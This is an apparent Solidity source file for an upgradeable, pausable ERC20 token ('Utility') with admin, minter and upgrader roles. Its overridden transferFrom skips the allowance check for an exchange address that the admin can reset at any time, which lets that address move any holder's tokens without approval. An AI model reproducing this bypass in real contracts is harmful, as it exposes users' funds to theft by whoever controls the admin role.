// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts-upgradeable/token/ERC20/ERC20Upgradeable.sol";
import "@openzeppelin/contracts-upgradeable/token/ERC20/extensions/ERC20PausableUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/AccessControlUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

interface Exchange {
    function link(address) external view returns (address);
    function linkBach(address[] calldata) external view returns (address[] memory);
}

// Proxy = 0xBC15d5Ea7f0f903B0E47D730A88d39F8b1541018
// Utility = 0x663D3733Da5A472b2A366E70cBe64191b45f3C19

abstract contract UtilityBase is Initializable, ERC20Upgradeable, ERC20PausableUpgradeable, AccessControlUpgradeable, UUPSUpgradeable {
    bytes32 public constant PAUSER_ROLE = keccak256("PAUSER_ROLE");
    bytes32 public constant MINTER_ROLE = keccak256("MINTER_ROLE");
    bytes32 public constant UPGRADER_ROLE = keccak256("UPGRADER_ROLE");
    Exchange public exchange;


    function _update(address from, address to, uint256 value) internal virtual override(ERC20Upgradeable, ERC20PausableUpgradeable) {
        super._update(from, to, value);
    }
}

contract UtilityOverride is UtilityBase {

    /// @custom:oz-upgrades-unsafe-allow constructor
    constructor() {
        _disableInitializers();
    }

    // cuando deployo utility dejarlo como initialize(), con security cambiarlo a _Utility_initialize()
    function _Utility_initialize(string memory _name, string memory _symbol) initializer public virtual {
        __ERC20_init(_name, _symbol);
        __ERC20Pausable_init();
        __AccessControl_init();
        __UUPSUpgradeable_init();

        _grantRole(DEFAULT_ADMIN_ROLE, _msgSender());
        _grantRole(PAUSER_ROLE, _msgSender());
        _grantRole(MINTER_ROLE, _msgSender());
        _grantRole(UPGRADER_ROLE, _msgSender());
    }

    function pause() public onlyRole(PAUSER_ROLE) {
        _pause();
    }

    function unpause() public onlyRole(PAUSER_ROLE) {
        _unpause();
    }

    function mint(address to, uint256 amount) public virtual onlyRole(MINTER_ROLE) {
        _mint(to, amount);
    }

    function _authorizeUpgrade(address newImplementation) internal onlyRole(UPGRADER_ROLE) override {
    }

    function decimals() public view virtual override returns (uint8) {
        return 6;
    }
}

contract Utility is UtilityOverride {
    event ChangeExchange(address indexed _exchange, address from, uint256 timeStamp);

    function setExchange(address _exchange) external onlyRole(DEFAULT_ADMIN_ROLE) {
        exchange = Exchange(_exchange);
        emit ChangeExchange(_exchange,msg.sender,block.timestamp);
    }

    function transferFrom(address from, address to, uint256 value) public virtual override returns (bool) {
        address spender = _msgSender();
        if(spender != address(exchange) ) {
            _spendAllowance(from, spender, value);
        }
        _transfer(from, to, value);
        return true;
    }
}